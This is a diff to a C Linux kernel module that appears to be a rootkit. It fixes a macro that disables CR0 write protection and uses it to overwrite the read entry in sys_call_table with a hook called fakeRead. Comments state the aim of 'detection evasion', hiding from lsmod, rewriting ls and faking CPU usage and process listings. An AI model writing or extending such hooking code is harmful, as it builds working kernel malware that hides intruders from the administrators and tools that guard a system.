@@ -45,11 +45,18 @@ static asmlinkage long fakeRead(int fd, char __user *buf, size_t count) {
 
 //Lemme write to syscall table real quick
 #define CRO_WRITE_UNLOCK(x) \
-	do {i \
-		write_cr0(read_cr0() & (~X86_CR0_WP)); \
-		x; \
-		write_cr0(read_cr0() | X86_CR0_WP); \
-	} while(0)
+	do { \
+    	unsigned long __cr0; \
+    	preempt_disable(); \
+    	__cr0 = read_cr0() & (~X86_CR0_WP); \
+    	BUG_ON(unlikely((__cr0 & X86_CR0_WP))); \
+    	write_cr0(__cr0); \
+    	x; \
+    	__cr0 = read_cr0() | X86_CR0_WP; \
+    	BUG_ON(unlikely(!(__cr0 & X86_CR0_WP))); \
+    	write_cr0(__cr0); \
+    	preempt_enable(); \
+  	} while (0)
 
 static struct file_operations file_ops
 = {
@@ -214,7 +221,6 @@ static ssize_t device_write(struct file *filp,
 			{
 			unsigned long *syscall_table; 
 			printk("Hooking into sys_calls for general detection evasion\n");
-
 			/*
 			 1. re-write ls binary
 			 2. do not showup in lsmod
@@ -223,14 +229,14 @@ static ssize_t device_write(struct file *filp,
 			
 			//Syscall modification test
 			syscall_table = (void *)kallsyms_lookup_name("sys_call_table");
-			if(syscall_table == 0) {
+			if(syscall_table == NULL) {
 				printk("Could not find address of sys_call_table\n");
 				return write_bytes;
 			}
 
 			//save old read
 			orig_read = (typeof(sys_read) *)syscall_table[__NR_read];
-			syscall_table[__NR_read] = (void *)fakeRead;
+			CRO_WRITE_UNLOCK({ syscall_table[__NR_read] = (void *)&fakeRead; });
 			break;
 			}
 		case 4: //Fake CPU usage and programs running 
